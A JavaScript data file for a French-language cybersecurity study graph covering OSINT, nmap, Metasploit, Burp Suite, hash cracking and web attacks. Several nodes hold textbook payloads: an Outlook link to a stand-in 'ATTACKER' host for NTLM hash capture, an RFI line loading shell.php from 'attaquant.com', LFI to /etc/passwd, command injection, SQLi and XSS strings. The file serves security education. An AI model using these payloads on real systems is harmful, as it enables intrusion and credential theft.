export const knowledgeNodes = [
  // --- ROOT NODES ---
  { 
    id: 'root_cyber', 
    label: 'CYBERSECURITY', 
    group: 'root', 
    desc: 'Le domaine de la sécurité offensive et défensive.',
    details: [
        { type: 'text', content: 'Ensemble des lois, politiques, outils, dispositifs, concepts et mécanismes de sécurité...' }
    ]
  },

  // --- CHAPTER: OSINT ---
  { 
    id: 'osint', 
    label: 'OSINT', 
    group: 'osint', 
    desc: 'Open Source Intelligence : Collecte de renseignements sur des sources ouvertes.',
    details: [
        { type: 'text', content: 'L\'OSINT (Open Source INTelligence) est une méthode de renseignement...' },
        { type: 'text', content: 'Le but est de trouver des informations publiquement disponibles sur une cible.' }
    ]
  },
  { 
    id: 'google_dorking', 
    label: 'Google Dorking', 
    group: 'osint_tech', 
    desc: 'Techniques de recherche avancée via Google.',
    details: [
        { type: 'text', content: 'Le Google Dorking permet d\'affiner les recherches Google pour trouver des informations sensibles :' },
        { type: 'list', items: [
            'site:google.com : restreint la recherche au site spécifié',
            'inurl:admin : pages contenant "admin" dans l\'URL',
            'filetype:pdf : recherche uniquement les fichiers PDF',
            'intitle:admin : pages avec "admin" dans leur titre',
            'cache:example.com : voir la version en cache de Google'
        ]}
    ]
  },
  { 
    id: 'recon', 
    label: 'Reconnaissance', 
    group: 'osint_tech', 
    desc: 'Enquête préliminaire sur une cible (Passive vs Active).',
    details: [
        { type: 'text', content: 'La reconnaissance (recon) est une enquête préliminaire visant à collecter des informations sur une cible. C\'est la première étape de la Kill Chain.' },
        { type: 'subtitle', content: 'Reconnaissance Passive' },
        { type: 'text', content: 'S\'appuie sur des connaissances publiquement accessibles, sans engagement direct avec la cible (WHOIS, DNS, Shodan).' },
        { type: 'subtitle', content: 'Reconnaissance Active' },
        { type: 'text', content: 'Nécessite un engagement direct et peut être détectée (Ping, Traceroute, Port Scan, Netcat).' }
    ]
  },
  { 
    id: 'whois', 
    label: 'WHOIS', 
    group: 'osint_tool', 
    desc: 'Protocole pour identifier le propriétaire d\'un nom de domaine.',
    details: [
        { type: 'text', content: 'WHOIS est un protocole de requête-réponse (port TCP 43).' },
        { type: 'list', items: ['Registrar : organisme d\'enregistrement', 'Informations de contact (souvent masquées)', 'Dates (création, expiration)', 'Name Servers'] },
        { type: 'code', content: 'whois DOMAIN_NAME' }
    ]
  },
  { 
    id: 'dns_lookup', 
    label: 'DNS Lookup', 
    group: 'osint_tool', 
    desc: 'Interrogation des enregistrements DNS (A, MX, TXT).',
    details: [
        { type: 'text', content: 'Les outils de lookup DNS permettent d\'obtenir les IPs et enregistrements associés.' },
        { type: 'subtitle', content: 'nslookup' },
        { type: 'code', content: 'nslookup -type=A example.com 1.1.1.1' },
        { type: 'code', content: 'nslookup -type=MX example.com' },
        { type: 'text', content: 'Types courants : A (IPv4), AAAA (IPv6), CNAME (Alias), MX (Mail), SOA, TXT.' },
        { type: 'subtitle', content: 'dig' },
        { type: 'code', content: 'dig @1.1.1.1 example.com A' }
    ]
  },
  { 
    id: 'subdomain', 
    label: 'Subdomains', 
    group: 'osint_tech', 
    desc: 'Découverte de sous-domaines.',
    details: [
        { type: 'text', content: 'Les sous-domaines peuvent révéler des informations cruciales et présenter des vulnérabilités.' },
        { type: 'text', content: 'Outils : DNSDumpster (en ligne), Sublist3r, Amass.' },
        { type: 'text', content: 'DNSDumpster permet de visualiser graphiquement les relations DNS.' }
    ]
  },
  { 
    id: 'shodan', 
    label: 'Shodan.io', 
    group: 'osint_tool', 
    desc: 'Moteur de recherche des objets connectés.',
    details: [
        { type: 'text', content: 'Shodan indexe les services et dispositifs exposés en ligne (IoT, serveurs, webcam).' },
        { type: 'list', items: ['Adresses IP', 'Bannières de services', 'Certificats SSL', 'Localisation'] },
        { type: 'text', content: 'Utile pour identifier la surface d\'attaque sans engagement actif (Recon Passive).' }
    ]
  },
  // --- ACTIVE RECON TOOLS ---
  {
    id: 'tool_ping',
    label: 'Ping',
    group: 'osint_tool',
    desc: 'Vérifie si un système est en ligne (ICMP).',
    details: [
        { type: 'code', content: 'ping -c 4 TARGET' },
        { type: 'text', content: 'Utilise ICMP Echo Request (type 8) et Reply (type 0).' },
        { type: 'text', content: 'Permet de vérifier la connectivité, le blocage firewall et la latence.' }
    ]
  },
  {
    id: 'tool_traceroute',
    label: 'Traceroute',
    group: 'osint_tool',
    desc: 'Identifie le chemin réseau.',
    details: [
        { type: 'code', content: 'traceroute HOSTNAME' },
        { type: 'text', content: 'Sur Windows : tracert' },
        { type: 'text', content: 'Manipule le TTL (Time To Live) pour identifier les routeurs intermédiaires.' }
    ]
  },
  {
    id: 'tool_telnet',
    label: 'Telnet',
    group: 'osint_tool',
    desc: 'Banner grabbing sur TCP.',
    details: [
        { type: 'code', content: 'telnet IP_ADDRESS PORT' },
        { type: 'text', content: 'Port par défaut : TCP 23. Attention, transmission en clair.' },
        { type: 'text', content: 'Sert à identifier le type et la version du service connecté.' }
    ]
  },
  {
    id: 'tool_netcat',
    label: 'Netcat (nc)',
    group: 'osint_tool',
    desc: 'Outil polyvalent TCP/UDP.',
    details: [
        { type: 'subtitle', content: 'Mode Client' },
        { type: 'code', content: 'nc IP_ADDRESS PORT' },
        { type: 'subtitle', content: 'Mode Serveur' },
        { type: 'code', content: 'nc -l -p PORT' },
        { type: 'text', content: 'Utile pour : Banner grabbing, Reverse Shells, Transfert de fichiers.' }
    ]
  },

  // --- NETWORK SCANNING ---
  { 
    id: 'net_scan', 
    label: 'Network Scanning', 
    group: 'network', 
    desc: 'Cartographie des systèmes actifs et des ports ouverts.',
    details: [
        { type: 'text', content: 'Phase cruciale pour cartographier la surface d\'attaque et identifier les systèmes actifs.' }
    ]
  },
  { 
    id: 'nmap', 
    label: 'Nmap', 
    group: 'network_tool', 
    desc: 'Le scanner de réseau par excellence.',
    details: [
        { type: 'subtitle', content: 'Host Discovery (Ping Scan)' },
        { type: 'code', content: 'nmap -sn TARGET' },
        { type: 'text', content: '-PR : ARP Scan (Local, très fiable)\n-sn : Ping Scan (sans port scan)' },

        { type: 'subtitle', content: 'Types de Scan de Ports' },
        { type: 'list', items: [
            '-sT (Connect Scan) : Utilisateur non-privilégié, handshake complet (SYN->SYN/ACK->ACK). Détectable.',
            '-sS (SYN Scan) : Root/Sudo requis, default. Rapide, furtif, "Half-open".',
            '-sU (UDP Scan) : Lent, pour les services UDP.'
        ]},
        
        { type: 'subtitle', content: 'Options Utiles' },
        { type: 'code', content: 'nmap -sC -sV -oA output TARGET' },
        { type: 'list', items: [
            '-sC : Scripts par défaut',
            '-sV : Versions des services',
            '-oA : Output tous formats (nmap, gnmap, xml)',
            '-p- : Tous les 65535 ports',
            '--top-ports 10 : Top 10 ports courants'
        ]},

        { type: 'subtitle', content: 'Timing' },
        { type: 'text', content: '-T0 à -T5 (T0 paranoïaque, T5 insane). T4 est recommandé pour les CTF.' }
    ]
  },
    { 
    id: 'masscan', 
    label: 'Masscan', 
    group: 'network_tool', 
    desc: 'Scanner de ports ultra-rapide.',
    details: [
        { type: 'text', content: 'Scanner asynchrone capable de scanner Internet entier en quelques minutes.' },
        { type: 'code', content: 'masscan -p1-65535 10.10.10.10 --rate=1000' }
    ]
  },

  // --- PENTESTING ---
  { 
    id: 'pentest', 
    label: 'Pentesting', 
    group: 'pentest', 
    desc: 'Tests d\'intrusion et méthodes d\'exploitation.',
    details: []
  },
  { 
    id: 'social_eng', 
    label: 'Social Engineering', 
    group: 'pentest_tech', 
    desc: 'Manipulation psychologique.',
    details: [
        { type: 'text', content: 'Techniques pour manipuler les gens afin qu\'ils divulguent des informations confidentielles.' },
        { type: 'subtitle', content: 'Outils' },
        { type: 'text', content: 'SET (Social-Engineer Toolkit) : Framework pour l\'ingénierie sociale (vecteurs d\'attaque custom).' },
        { type: 'code', content: 'setoolkit' }
    ]
  },
  { 
    id: 'bypass', 
    label: 'Bypass Technics', 
    group: 'pentest_tech', 
    desc: 'Contournement des protections.',
    details: [
        { type: 'subtitle', content: 'Outlook Moniker Links' },
        { type: 'text', content: 'Exploitation de la "Protected View" d\'Outlook via SMB et COM pour capturer des hashs NTLM.' },
        { type: 'code', content: '<a href="file://ATTACKER/test!exploit">Click me</a>' },
        { type: 'subtitle', content: 'Contournement de filtres' },
        { type: 'text', content: 'Utilisation d\'encodage, double extensions, null bytes.' }
    ]
  },

  // --- TOOLS ---
  { 
    id: 'tools', 
    label: 'Outils', 
    group: 'tools', 
    desc: 'Arsenal général du pentester.',
    details: []
  },
  { 
    id: 'metasploit', 
    label: 'Metasploit', 
    group: 'tools_framework', 
    desc: 'Framework complet d\'exploitation.',
    details: [
        { type: 'code', content: 'msfconsole' },
        { type: 'subtitle', content: 'Commandes de base' },
        { type: 'list', items: [
            'search <keyword> : Chercher un module',
            'use <id/path> : Sélectionner un module',
            'set RHOSTS <ip> : Définir la cible',
            'set LHOST <ip> : Définir l\'attaquant (nous)',
            'info : Informations sur le module',
            'show payloads : Lister les payloads compatibles',
            'run / exploit -z : Lancer l\'attaque'
        ]},
        { type: 'subtitle', content: 'Sessions' },
        { type: 'code', content: 'sessions -i <id>' }
    ]
  },
  { 
    id: 'msf_payloads', 
    label: 'Payloads', 
    group: 'tools_detail', 
    desc: 'Charges utiles (Reverse Shell, Meterpreter).',
    details: [
        { type: 'text', content: 'Code exécuté sur la cible après exploitation.' },
        { type: 'subtitle', content: 'Types' },
        { type: 'list', items: [
            'Inline (Single) : Tout en un. Ex: shell_reverse_tcp',
            'Staged : En plusieurs étapes (Stager + Stage). Ex: shell/reverse_tcp'
        ]},
        { type: 'text', content: 'Convention de nommage : "/" = Staged, "_" = Single.' },
        { type: 'code', content: 'msfvenom -p windows/x64/meterpreter/reverse_tcp ...' }
    ]
  },

  // --- BURP SUITE ---
  { 
    id: 'burp', 
    label: 'Burp Suite', 
    group: 'burp', 
    desc: 'Plateforme pour le pentest web.',
    details: [
        { type: 'text', content: 'Proxy d\'interception : se place entre le navigateur et le serveur web.' },
        { type: 'text', content: 'Editions : Community (Gratuit, limité), Professional (Scanner auto, Intruder rapide), Enterprise.' }
    ]
  },
  { 
    id: 'burp_proxy', 
    label: 'Proxy', 
    group: 'burp_module', 
    desc: 'Interception du trafic.',
    details: [
        { type: 'text', content: 'Coeur de Burp. Permet d\'intercepter, modifier et dropper les paquets.' },
        { type: 'list', items: [
            'Intercept is on/off : Contrôle du flux',
            'HTTP History : Log de toutes les requêtes (même sans interception)',
            'Match and Replace : Modifications à la volée via Regex'
        ]},
        { type: 'text', content: 'Nécessite de configurer le navigateur (souvent via FoxyProxy sur localhost:8080) et d\'importer le certificat CA de Burp.' }
    ]
  },
  { 
    id: 'burp_repeater', 
    label: 'Repeater', 
    group: 'burp_module', 
    desc: 'Rejeu de requêtes.',
    details: [
        { type: 'text', content: 'Envoyer des requêtes manuellement et analyser la réponse.' },
        { type: 'text', content: 'Utile pour le "trial and error" (SQLi, IDOR, ajustement de payload).' },
        { type: 'text', content: 'Raccourci : Ctrl + R (Send to Repeater).' }
    ]
  },
  { 
    id: 'burp_intruder', 
    label: 'Intruder', 
    group: 'burp_module', 
    desc: 'Automatisation d\'attaques.',
    details: [
        { type: 'text', content: 'Outil de Fuzzing et Brute-force. Permet de bombarder des paramètres avec des wordlists.' },
        { type: 'subtitle', content: 'Modes d\'attaque' },
        { type: 'list', items: [
            'Sniper : 1 set de payloads, testés un par un sur chaque position.',
            'Battering Ram : 1 set de payloads, placé partout en même temps.',
            'Pitchfork : Plusieurs sets, itère en parallèle (1-1, 2-2...).',
            'Cluster Bomb : Plusieurs sets, itère toutes les combinaisons (1-1, 1-2, 2-1...).'
        ]}
    ]
  },
  { 
    id: 'burp_decoder', 
    label: 'Decoder', 
    group: 'burp_module', 
    desc: 'Encodage/Décodage.',
    details: [
        { type: 'text', content: 'Transforme les données : Base64, URL Encoding, HTML, Hex, Octal, Gzip.' },
        { type: 'text', content: 'Permet d\'encoder des payloads ou de décoder des données exfiltrées.' }
    ]
  },
   { 
    id: 'burp_comparer', 
    label: 'Comparer', 
    group: 'burp_module', 
    desc: 'Comparaison visuelle.',
    details: [
        { type: 'text', content: 'Diff visuel entre deux requêtes ou réponses (Words ou Bytes).' },
        { type: 'text', content: 'Utile pour voir comment une entrée utilisateur modifie la réponse.' }
    ]
  },
   { 
    id: 'burp_sequencer', 
    label: 'Sequencer', 
    group: 'burp_module', 
    desc: 'Analyse d\'entropie.',
    details: [
        { type: 'text', content: 'Analyse la qualité du caractère aléatoire (entropie) des tokens de session.' }
    ]
  },
  
  // --- NOUVEAUX ELEMENTS DE PENTESTING.TEX ---
  {
      id: 'burp_target',
      label: 'Target',
      group: 'burp_module',
      desc: 'Cartographie et Scope.',
      details: [
          { type: 'text', content: 'Site Map : Arborescence détectée de l\'application.' },
          { type: 'text', content: 'Scope : Définir le périmètre du test pour éviter de scanner hors cible.' }
      ]
  },


  // --- CRYPTO ---
  { 
    id: 'crypto', 
    label: 'Cryptographie', 
    group: 'crypto', 
    desc: 'Étude du chiffrement.',
    details: []
  },
  { 
    id: 'hash_crack', 
    label: 'Hash Cracking', 
    group: 'crypto_tech', 
    desc: 'Retrouver le clair d\'un hash.',
    details: [
        { type: 'text', content: 'Attaque par dictionnaire ou Brute-force.' },
        { type: 'subtitle', content: 'Formats courants' },
        { type: 'list', items: ['MD5', 'SHA-1/256/512', 'Bcrypt', 'NTLM'] }
    ]
  },
  { 
    id: 'john', 
    label: 'John the Ripper', 
    group: 'crypto_tool', 
    desc: 'Cracker hors-ligne CPU.',
    details: [
        { type: 'code', content: 'john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt' },
        { type: 'code', content: 'john --format=raw-md5 hash.txt' }
    ]
  },
  { 
    id: 'hashcat', 
    label: 'Hashcat', 
    group: 'crypto_tool', 
    desc: 'Cracker GPU.',
    details: [
        { type: 'text', content: 'Plus rapide que John grâce au GPU.' },
        { type: 'code', content: 'hashcat -m 0 -a 0 hash.txt rockyou.txt' }
    ]
  },

  // --- WEB HACKING ---
  { 
    id: 'web', 
    label: 'Web Hacking', 
    group: 'web', 
    desc: 'Exploitation Web.',
    details: [
        { type: 'text', content: 'OWASP Top 10.' }
    ]
  },
  { 
    id: 'web_discovery', 
    label: 'Web Discovery', 
    group: 'web_tech', 
    desc: 'Énumération technologique.',
    details: [
        { type: 'text', content: 'Wappalyzer, Gobuster, Nikto.' },
        { type: 'code', content: 'gobuster dir -u http://target -w list.txt' }
    ]
  },
  { 
    id: 'idor', 
    label: 'IDOR', 
    group: 'web_attack', 
    desc: 'Reference Directe à un Objet non Sécurisé.',
    details: [
        { type: 'text', content: 'Changer l\'ID dans l\'URL pour accéder aux données d\'un autre utilisateur.' },
        { type: 'code', content: '/profile?id=100 -> /profile?id=101' }
    ]
  },
  { 
    id: 'lfi_rfi', 
    label: 'File Inclusion', 
    group: 'web_attack', 
    desc: 'Inclusion de fichiers.',
    details: [
        { type: 'subtitle', content: 'LFI (Local)' },
        { type: 'code', content: '/page.php?file=../../../../etc/passwd' },
        { type: 'subtitle', content: 'RFI (Remote)' },
        { type: 'code', content: '/page.php?file=http://attaquant.com/shell.php' }
    ]
  },
  { 
    id: 'xss', 
    label: 'XSS', 
    group: 'web_attack', 
    desc: 'Cross-Site Scripting.',
    details: [
        { type: 'text', content: 'Injection de JS exécuté par le client.' },
        { type: 'subtitle', content: 'Types' },
        { type: 'list', items: ['Reflected (pêche)', 'Stored (persistant)', 'DOM-based'] },
        { type: 'code', content: '<script>alert(1)</script>' }
    ]
  },
  { 
    id: 'ssrf', 
    label: 'SSRF', 
    group: 'web_attack', 
    desc: 'Server-Side Request Forgery.',
    details: [
        { type: 'text', content: 'Forcer le serveur à faire des requêtes vers l\'interne (localhost, admin panel).' },
        { type: 'code', content: 'url=http://localhost/admin' }
    ]
  },
  { 
    id: 'cmd_injection', 
    label: 'Command Injection', 
    group: 'web_attack', 
    desc: 'Injection de commandes OS.',
    details: [
        { type: 'text', content: 'Exécuter des commandes shell via une entrée utilisateur.' },
        { type: 'code', content: 'example.com/ping?ip=127.0.0.1; whoami' }
    ]
  },
  { 
    id: 'sqli', 
    label: 'SQL Injection', 
    group: 'web_attack', 
    desc: 'Injection SQL.',
    details: [
        { type: 'text', content: 'Manipuler la requête SQL.' },
        { type: 'code', content: "' OR 1=1 --" },
        { type: 'subtitle', content: 'UNION Based' },
        { type: 'code', content: "' UNION SELECT 1, database(), user() --" }
    ]
  },
  { 
    id: 'sqli_blind', 
    label: 'Blind SQLi', 
    group: 'web_attack', 
    desc: 'SQLi à l\'aveugle.',
    details: [
        { type: 'text', content: 'Pas de message d\'erreur, on se base sur le temps de réponse ou vrai/faux.' }
    ]
  },
];

export const knowledgeLinks = [
  // ROOT Connections
  { source: 'root_cyber', target: 'osint' },
  { source: 'root_cyber', target: 'pentest' },
  { source: 'root_cyber', target: 'tools' },
  { source: 'root_cyber', target: 'web' },
  { source: 'root_cyber', target: 'crypto' },

  // OSINT Cluster
  { source: 'osint', target: 'google_dorking' },
  { source: 'osint', target: 'recon' },
  
  // Recon Passive
  { source: 'recon', target: 'whois' },
  { source: 'recon', target: 'dns_lookup' },
  { source: 'recon', target: 'subdomain' },
  { source: 'recon', target: 'shodan' },
  
  // Recon Active (New Tools)
  { source: 'recon', target: 'tool_ping' },
  { source: 'recon', target: 'tool_traceroute' },
  { source: 'recon', target: 'tool_telnet' },
  { source: 'recon', target: 'tool_netcat' },

  { source: 'recon', target: 'net_scan' }, // Bridge to Network

  // Network Cluster
  { source: 'net_scan', target: 'nmap' },
  { source: 'net_scan', target: 'masscan' },
  { source: 'nmap', target: 'masscan' }, // Related tools

  // Pentest Cluster
  { source: 'pentest', target: 'social_eng' },
  { source: 'pentest', target: 'bypass' },

  // Tools Cluster
  { source: 'tools', target: 'metasploit' },
  { source: 'tools', target: 'burp' }, // Burp is a tool but big enough to be separate
  { source: 'metasploit', target: 'msf_payloads' },

  // Burp Suite Cluster
  { source: 'burp', target: 'burp_target' },
  { source: 'burp', target: 'burp_proxy' },
  { source: 'burp', target: 'burp_repeater' },
  { source: 'burp', target: 'burp_intruder' },
  { source: 'burp', target: 'burp_decoder' },
  { source: 'burp', target: 'burp_comparer' },
  { source: 'burp', target: 'burp_sequencer' },
  // Inter-module links
  { source: 'burp_proxy', target: 'burp_repeater' }, // Typical workflow
  { source: 'burp_proxy', target: 'burp_intruder' }, 

  // Crypto Cluster
  { source: 'crypto', target: 'hash_crack' },
  { source: 'hash_crack', target: 'john' },
  { source: 'hash_crack', target: 'hashcat' },

  // Web Cluster
  { source: 'web', target: 'web_discovery' },
  { source: 'web', target: 'xss' },
  { source: 'web', target: 'sqli' },
  { source: 'web', target: 'cmd_injection' },
  { source: 'web', target: 'ssrf' },
  { source: 'web', target: 'lfi_rfi' },
  { source: 'web', target: 'idor' },
  { source: 'sqli', target: 'sqli_blind' },

  // Cross-Cluster Connections (The "Nexus" feel)
  { source: 'web', target: 'burp' }, // Web hacking uses Burp
  { source: 'xss', target: 'burp_intruder' }, // Fuzzing attacks
  { source: 'sqli', target: 'burp_intruder' },
  { source: 'nmap', target: 'recon' }, // Nmap is recon
  { source: 'social_eng', target: 'osint' }, // SE uses OSINT
  { source: 'google_dorking', target: 'web_discovery' }, // Dorking helps web discovery
  { source: 'subdomain', target: 'web_discovery' }, // Subdomains are web targets
  { source: 'tool_netcat', target: 'msf_payloads' }, // Netcat catches reverse shells
  { source: 'metasploit', target: 'web' }, // MSF has web exploits
  { source: 'bypass', target: 'msf_payloads' }, // AV Evasion concerns payloads
  { source: 'bypass', target: 'web' }, // WAF Bypass
  { source: 'nmap', target: 'net_scan' }, // Ensure hierarchy
  { source: 'burp_repeater', target: 'sqli' }, // Repeater used for SQLi
  { source: 'burp_repeater', target: 'xss' }, // Repeater used for XSS
  { source: 'burp_intruder', target: 'hash_crack' }, // Intruder can brute force logins (conceptual link to cracking)
  { source: 'john', target: 'hashcat' }, // Competitors/Complementary
  { source: 'shodan', target: 'osint' }, // Shodan is OSINT
  { source: 'osint', target: 'whois' }, // Hierarchy verification
  { source: 'osint', target: 'dns_lookup' }, // Hierarchy verification
];
